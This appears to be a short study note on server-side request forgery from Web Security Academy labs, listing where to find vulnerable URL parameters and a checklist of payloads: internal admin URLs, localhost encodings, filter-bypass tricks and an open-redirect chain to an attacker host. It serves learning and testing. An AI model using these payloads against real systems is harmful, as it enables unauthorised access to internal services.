### Where to look

Look for parameters in the URL or POST body being passed URLs, partial URLs, or hostnames. 
### What to try

- Local Server Request in POST body: `stockApi=http://192.168.0.68/admin`
- Back End Server IP Enumeration with Intruder: `stockApi=http://192.168.0.250:8080/admin`
- Local host alternates: `127.0.0.1`,`2130706433`, `017700000001`, `127.1`, `spoofed.burpcollaborator.net`
- Obfuscate Blocked Strings with URL encoding (or double encoding) or case variation
- Provide URL I control or switch protocols, such as `http:` to `https:`
- Embed credentials in URL: `https://expected-host:fakepassword@evil-host`
- Use URL fragment: `https://evil-host#expected-host`
- Use DNS naming hierarchy: `https://expected-host.evil-host`
- Utilize URL encoding and double encoding
- Combination of techniques: `http://localhost:80%2523@stock.weliketoshop.net/admin`
- Open redirection: `/product/nextProduct?currentProductId=6&path=http://evil-user.net`

### Details

More details can be found at [[Cyber Security/Learning/Web Security Academy/Server-side request forgery (SSRF)|Server-side request forgery (SSRF)]]
